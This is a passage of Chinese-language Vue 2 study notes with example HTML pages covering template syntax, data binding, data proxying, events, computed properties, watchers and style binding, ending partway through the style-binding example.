# Vue简介

![image-20220131171343011](vue_basic.assets/image-20220131171343011.png)

![image-20220131171420272](vue_basic.assets/image-20220131171420272.png)

![image-20220131171923249](vue_basic.assets/image-20220131171923249.png)

![image-20220131172305061](vue_basic.assets/image-20220131172305061.png)

![image-20220131172443362](vue_basic.assets/image-20220131172443362.png)

![image-20220131172709246](vue_basic.assets/image-20220131172709246.png)

![image-20220131172942822](vue_basic.assets/image-20220131172942822.png)

# 初识vue

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>
    <!--
        初识vue：
        1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象
        2.root容器里的代码依然符合html规范，只不过混入了一些特殊的vue语法
        3.root容器里的代码被称为【vue模板】
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>Hello, {{name}}</h1>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //创建vue实例
        new Vue({
            el: '#root', //el用于指定当前vue实例为哪个容器服务，值通常为css选择器字符串
            data: { //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象
                name: '尚硅谷'
            }
        });


    </script>


    
</body>
</html>
```

![image-20220201120423562](vue_basic.assets/image-20220201120423562.png)

```
初识vue：
        1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象
        2.root容器里的代码依然符合html规范，只不过混入了一些特殊的vue语法
        3.root容器里的代码被称为【vue模板】
        4.vue实例和容器是一一对应的
        5.真是开发中只有一个vue实例，并且会配合着组件一起使用
        6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性
        7.一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新


        注意区分js表达式和js代码（语句）：
            1.表达式：一个表达式会生成一个值，可以放在任何一个需要值的地方
                （1）. a
                （2）. a+b
                （3）. demo(1)
                （4）. x===y ? 'a' : 'b'
            2.js代码（语句）
                （1）.if(){}
                （2）.for(){}
```

# 模板语法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>
    <!-- 
    Vue模板语法有2大类：
        1.插值语法：
                功能：用于解析标签体内容。
                写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
        2.指令语法：
                功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
                举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
                            且可以直接读取到data中的所有属性。
                备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

    -->
    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好,{{name}}</h3>
        <hr>
        <h1>指令语法</h1>
        <a v-bind:href="shool.url.toUpperCase()" v-bind:x='hello'>点我去{{shool.name}}</a>
        <!-- 【v-bind】可以简化为【:】 -->
        <a :href="shool.url" :x='hello'>点我去{{shool.name}}</a>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el: '#root',
            data:{
                name: 'jack',
                hello: '你好',
                shool: {
                    name: '尚硅谷',
                    url: 'http://www.atguigu.com',
                }
            }
        })
        
    </script>


    
</body>
</html>
```

![image-20220201140740652](vue_basic.assets/image-20220201140740652.png)

![image-20220201140755559](vue_basic.assets/image-20220201140755559.png)

# 数据绑定

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>

    <!-- 
    Vue中有2种数据绑定的方式：
            1.单向绑定(v-bind)：数据只能从data流向页面。
            2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
                备注：
                        1.双向绑定一般都应用在表单类元素上（如：input、select等）
                        2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
    -->
    
    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 普通写法 -->
        <!-- 单向数据绑定：<input type="text" v-bind:value="name"><br>
        双向数据绑定：<input type="text" v-model:value="name"><br> -->

        <!-- 简单写法 -->
        单向数据绑定：<input type="text" :value="name"><br>
        双向数据绑定：<input type="text" v-model="name"><br>
        

        <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
        <!-- <h2 v-bind:x="name">你好啊</h2> -->
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷'
            }
        })

    </script>


    
</body>
</html>
```

![image-20220201150512088](vue_basic.assets/image-20220201150512088.png)

# el与data的两种写法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>
    <!-- 
    data与el的2种写法
            1.el有2种写法
                            (1).new Vue时候配置el属性。
                            (2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
            2.data有2种写法
                            (1).对象式
                            (2).函数式
                            如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
            3.一个重要的原则：
                            由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>你好, {{name}}</h1>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //el的两种写法
        // const v = new Vue({
        //     // el:'#root',//第一种写法
        //     data:{
        //         name:'尚硅谷'
        //     }
        // })

        // console.log(v);
        // v.$mount('#root');//第二种写法

        //data的两种写法
        new Vue({
            el:'#root',
            //data的第一种写法：对象式
            // data:{
            //     name:'尚硅谷'
            // }
            //data的第二种写法：函数式
            data(){
                console.log('@@@',this);//此处的this是Vue实例对象
                return{
                    name:'尚硅谷'
                }
            }
        })

    </script>


    
</body>
</html>
```

# MVVM模型

```
1. M：模型(Model) ：对应 data 中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel) ： Vue
```

![image-20220201153217707](vue_basic.assets/image-20220201153217707.png)

![image-20220201153925371](vue_basic.assets/image-20220201153925371.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>

    <!-- 
        MVVM模型
                    1. M：模型(Model) ：data中的数据
                    2. V：视图(View) ：模板代码
                    3. VM：视图模型(ViewModel)：Vue实例
        观察发现：
                    1.data中所有的属性，最后都出现在了vm身上。
                    2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
    -->
   
    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>学校名称：{{name}}</h1>
        <h1>学校地址：{{address}}</h1>
        <!-- <h1>测试一下1：{{1+1}}</h1>
        <h1>测试一下2：{{$options}}</h1>
        <h1>测试一下3：{{$emit}}</h1>
        <h1>测试一下4：{{_c}}</h1> -->

    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                name: '尚硅谷',
                address: '北京',
                // a: 1
            }
        })

        console.log(vm);
       
    </script>


    
</body>
</html>
```

# 数据代理

## Object.defineProperty方法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <script>
        let num = 18;

        let person = {
            name: '张三',
            sex: '男',
            // age: num
        }

        Object.defineProperty(person,'age',{
            // value:18,
            // enumerable: true, //设置是否可以枚举 默认false
            // writable: true, //设置是否可以被修改 默认false
            // configurable: true,  //设置是否可以被删除 默认false
            //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
            get(){
                console.log('有人读取age属性了');
                return num;
            },
            //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
            set(value){
                console.log('有人修改age属性了，且值是',value);
                num = value;
            }
        })

        // console.log(Object.keys(person));
        for (const key in person) {
            console.log('@',person[key]);
        }

        console.log(person);
    </script>
    
</body>
</html>
```

![image-20220201163954611](vue_basic.assets/image-20220201163954611.png)

## 何为数据代理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写） -->

    <script>
        let obj = {x:100};
        let obj2 = {y:200};

        Object.defineProperty(obj2,'x',{
            get(){
                return obj.x;
            },
            set(value){
                obj.x = value;
            }
        })

    </script>
    
</body>
</html>
```

![image-20220201164517116](vue_basic.assets/image-20220201164517116.png)

## vue中的数据代理

![image-20220201170659073](vue_basic.assets/image-20220201170659073.png)

# 事件处理

## 事件的基本使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
</head>
<body>
    <!-- 
    事件的基本使用：
                1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
                2.事件的回调需要配置在methods对象中，最终会在vm上；
                3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
                4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
                5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
    -->



    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <button v-on:click='showInfo1'>点我提示信息1（不传参）</button>
        <button @click='showInfo2(66,$event)'>点我提示信息2（传参）</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                name: '尚硅谷'
            },
            methods:{
                showInfo1(event){
                    // console.log(this === vm);//此处的this是vm
                    // console.log(event.target.innerText);
                    // console.log(a,b,c,d);
                    alert   ('同学你好！');
                },
                showInfo2(num,event){
                    console.log(num,event);
                    // console.log(this === vm);//此处的this是vm
                    // console.log(event.target.innerText);
                    // console.log(a,b,c,d);
                    alert   ('同学你好！！');
                }
            }
        })

    </script>


    
</body>
</html>
```

![image-20220203114132937](vue_basic.assets/image-20220203114132937.png)

## 事件修饰符

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
        *{
            margin-top: 20px;
        }

        .demo1{
            height: 50px;
            background-color: skyblue;
        }
        .box1{
            padding: 5px;
            background-color: skyblue;
        }

        .box2{
            padding: 5px;
            background-color: orange;
        }

        .list{
            width: 200px;
            height: 200px;
            background-color: peru;
            overflow: auto;
        }

        .list li{
            height: 100px;
        }
    </style>
</head>
<body>

    <!-- 
    Vue中的事件修饰符：
            1.prevent：阻止默认事件（常用）；
            2.stop：阻止事件冒泡（常用）；
            3.once：事件只触发一次（常用）；
            4.capture：使用事件的捕获模式；
            5.self：只有event.target是当前操作的元素时才触发事件；
            6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- prevent：阻止默认事件（常用） -->
        <a href="http://www.atguigu.com" @click.prevent='showInfo'>点我提示信息</a>
        <!-- stop：阻止事件冒泡（常用） -->
        <div class="demo1" @click='showInfo'>
            <button @click.stop='showInfo'>点我提示信息</button>
        </div>
        <!-- once：事件只触发一次（常用） -->
        <button @click.once='showInfo'>点我提示信息</button>
        <!-- capture：使用事件的捕获模式 -->
        <div class="box1" @click.capture='showMsg(1)'>
            div1
            <div class="box2" @click='showMsg(2)'>
                div2
            </div>
        </div>
        <!-- self：只有event.target是当前操作的元素时才触发事件 -->
        <div class="demo1" @click.self='showInfo'>
            <button @click='showInfo'>点我提示信息</button>
        </div>
        <!-- passive：事件的默认行为立即执行，无需等待事件回调执行完毕； -->

        <ul @wheel.passive='demo' class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>

    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                name: '尚硅谷'
            },
            methods:{
                showInfo(e){
                    // e.preventDefault();
                    // e.stopPropagation();
                    alert('同学你好');
                    // console.log(e.target);
                },

                showMsg(msg){
                    console.log(msg);
                },
                demo(){
                    for (let i = 0; i < 100000; i++) {
                        console.log('#');
                    }
                    console.log('累坏了');
                }
            }
            
        })

    </script>


    
</body>
</html>
```

![image-20220203114204908](vue_basic.assets/image-20220203114204908.png)

## 键盘事件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    1.Vue中常用的按键别名：
                回车 => enter
                删除 => delete (捕获“删除”和“退格”键)
                退出 => esc
                空格 => space
                换行 => tab (特殊，必须配合keydown去使用)
                上 => up
                下 => down
                左 => left
                右 => right

    2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

    3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
                (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
                (2).配合keydown使用：正常触发事件。

    4.也可以使用keyCode去指定具体的按键（不推荐）

    5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <input type="text" placeholder="按下回车提示输入" @keyup.huiche='showInfo'>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        Vue.config.keyCodes.huiche = 13;//定义了一个别名按键

        new Vue({
            el:'#root',
            data:{
                name: '尚硅谷'
            },
            methods: {
                showInfo(e){
                    // console.log(e.key,e.keyCode);
                    // console.log(e.keyCode);
                    // if(e.keyCode != 13) return;
                    console.log(e.target.value);
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220203114254494](vue_basic.assets/image-20220203114254494.png)

# 计算属性

## 1.姓名案例_插值语法实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        全名：<span>{{firstName.slice(0,3)}}-{{lastName}}</span>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                firstName: '张',
                lastName: '三'
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220122232246](vue_basic.assets/image-20220220122232246.png)

## 2.姓名案例_methods实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        全名：<span>{{fullName()}}</span>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                firstName: '张',
                lastName: '三'
            },
            methods:{
                fullName(){
                    console.log('@--fullName');
                    return this.firstName+'-'+this.lastName;
                }
            }
        })
    </script>


    
</body>
</html>
```

## 3.姓名案例_计算属性实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    计算属性：
            1.定义：要用的属性不存在，要通过已有属性计算得来。
            2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
            3.get函数什么时候执行？
                        (1).初次读取时会执行一次。
                        (2).当依赖的数据发生改变时会被再次调用。
            4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
            5.备注：
                    1.计算属性最终会出现在vm上，直接读取使用即可。
                    2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        全名：<span>{{fullName}}</span>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                firstName: '张',
                lastName: '三'
            },
            computed:{
                fullName:{
                    //作用：当有人读取fullName时，get会被调用，返回值作为fullName的值
                    //什么时候调用：1.初次读取fullName时2.所依赖的数据发生变化时
                    get(){
                        console.log('get被调用了');
                        return this.firstName+'-'+this.lastName;
                    },
                    //什么时候调用：当fullName被修改时
                    set(value){
                        const arr = value.split('-');
                        this.firstName = arr[0];
                        this.lastName = arr[1];
                    }
                }
            }
        })
    </script>


    
</body>
</html>
```

## 4.姓名案例_计算属性简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        全名：<span>{{fullName}}</span>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                firstName: '张',
                lastName: '三'
            },
            computed:{
                //完整写法
                // fullName:{
                //     get(){
                //         console.log('get被调用了');
                //         return this.firstName+'-'+this.lastName;
                //     },
                //     set(value){
                //         const arr = value.split('-');
                //         this.firstName = arr[0];
                //         this.lastName = arr[1];
                //     }
                // }

                //简写
                fullName(){
                    console.log('get被调用了');
                    return this.firstName + '-' + this.lastName;
                }
            }
        })
    </script>


    
</body>
</html>
```

# 监视属性

1. 通过通过 vm 对象的$watch()或 watch 配置来监视指定的属性
2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算

## 1.天气案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- 绑定事件的时候：@xxx='yyy' yyy可以写一些简单的语句 -->
        <button @click='changeWeather'>切换天气</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot;
                }
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽';
                }
            }
        })
    </script>


    
</body>
</html>
```

## 2.天气案例_监视属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    监视属性watch：
        1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
        2.监视的属性必须存在，才能进行监视！！
        3.监视的两种写法：
                (1).new Vue时传入watch配置
                (2).通过vm.$watch监视
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- 绑定事件的时候：@xxx='yyy' yyy可以写一些简单的语句 -->
        <button @click='changeWeather'>切换天气</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot;
                }
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽';
                }
            },
            watch:{
                // isHot:{
                //     immediate:true, //初始化时让handler调用一下
                //     //handler什么时候调用？当isHost发生改变时
                //     handler(newValue,oldValue){
                //         console.log('isHost被修改了');
                //         console.log(newValue,oldValue);
                //     }
                // }
            }
        })

        vm.$watch('isHot',{
            immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHost发生改变时
            handler(newValue,oldValue){
                console.log('isHost被修改了');
                console.log(newValue,oldValue);
            }
        })
    </script>


    
</body>
</html>
```

## 3.天气案例_深度监视

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    深度监视：
            (1).Vue中的watch默认不监测对象内部值的改变（一层）。
            (2).配置deep:true可以监测对象内部值改变（多层）。
    备注：
            (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
            (2).使用watch时根据数据的具体结构，决定是否采用深度监视。
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- 绑定事件的时候：@xxx='yyy' yyy可以写一些简单的语句 -->
        <button @click='changeWeather'>切换天气</button>
        <hr>
        <h3>a的值时:{{numbers.a}}</h3>
        <button @click="numbers.a++">点我让a++</button>
        <h3>b的值时:{{numbers.b}}</h3>
        <button @click="numbers.b++">点我让b++</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true,
                numbers: {
                    a:1,
                    b:1
                }
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot;
                }
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽';
                }
            },
            watch:{
                isHot:{
                    // immediate:true, //初始化时让handler调用一下
                    //handler什么时候调用？当isHost发生改变时
                    handler(newValue,oldValue){
                        console.log('isHost被修改了');
                        console.log(newValue,oldValue);
                    }
                },
                //监视多级结构中某个属性的变化
                // 'numbers.a': {
                //     handler(){
                //         console.log('a被改变了');
                //     }
                // },
                //监视多级结构中所有属性的变化
                numbers:{
                    deep:true,
                    handler(){
                        console.log('numbers被改变了');
                    }
                }

            }
        })

        
    </script>


    
</body>
</html>
```

![image-20220220122545604](vue_basic.assets/image-20220220122545604.png)

## 4.监视属性简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <!-- 绑定事件的时候：@xxx='yyy' yyy可以写一些简单的语句 -->
        <button @click='changeWeather'>切换天气</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true,
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot;
                }
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽';
                }
            },
            watch:{
                //正常写法
                // isHot:{
                //     // immediate:true, //初始化时让handler调用一下
                //     // deep:true, //深度监视
                //     //handler什么时候调用？当isHost发生改变时
                //     handler(newValue,oldValue){
                //         console.log('isHost被修改了');
                //         console.log(newValue,oldValue);
                //     }
                // },

                //简写
                // isHot(newVal,oldVal){
                //     console.log('isHot被修改了',newVal,oldVal);
                // }
                

            }
        })

        //正常写法
        // vm.$watch('isHot',{
        //     immediate:true, //初始化时让handler调用一下
        //     deep:true, //深度监视
        //     //handler什么时候调用？当isHost发生改变时
        //     handler(newValue,oldValue){
        //         console.log('isHost被修改了');
        //         console.log(newValue,oldValue);
        //     }
        // })

        vm.$watch('isHot',function(newVal,oldVal){
            console.log('isHot被修改了',newVal,oldVal);
        })

        
    </script>


    
</body>
</html>
```

## 5姓名案例_watch实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    computed和watch之间的区别：
            1.computed能完成的功能，watch都可以完成。
            2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
    两个重要的小原则：
                1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
                2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
                    这样this的指向才是vm 或 组件实例对象。
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        全名：<span>{{fullName}}</span>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                firstName: '张',
                lastName: '三',
                fullName: '张-三'
            },
            computed:{

            },
            watch:{
                firstName(newVal){
                    setTimeout(()=>{
                        this.fullName = newVal + '-' + this.lastName;
                    },1000)
                },
                lastName(newVal){
                    this.fullName = this.firstName + '-' + newVal;
                }
            }
        })
    </script>


    
</body>
</html>
```

# 绑定样式

**理解**

1. 在应用界面中, 某个(些)元素的样式是变化的 
2. class/style 绑定就是专门用来实现动态样式效果的技术

**class 绑定**

1. :class='xxx' 
2. 表达式是字符串: 'classA' 
3. 表达式是对象: {classA:isA, classB: isB}

4. 表达式是数组: ['classA', 'classB']

**style 绑定**

	1. :style="{ color: activeColor, fontSize: fontSize + 'px' }" 
 	2. 其中 activeColor/fontSize 是 data 属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
        
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		
    </style>
</head>
<body>

    <!-- 
    绑定样式：
            1. class样式
                        写法:class="xxx" xxx可以是字符串、对象、数组。
                                字符串写法适用于：类名不确定，要动态获取。
                                对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
                                数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
            2. style样式
                        :style="{fontSize: xxx}"其中xxx是动态值。
                        :style="[a,b]"其中a、b是样式对象。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 绑定class样式---字符串写法，适用于：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br><br>
        <!-- 绑定class样式---数组写法，适用于：样式的类名、个数不确定，需要动态指定 -->
        <div class="basic" :class="classArr">{{name}}</div> <br><br>
        <!-- 绑定class样式---数组写法，适用于：样式的类名、个数确定，需要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div>

        <div class="basic" :style="styleObj">{{name}}</div>
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
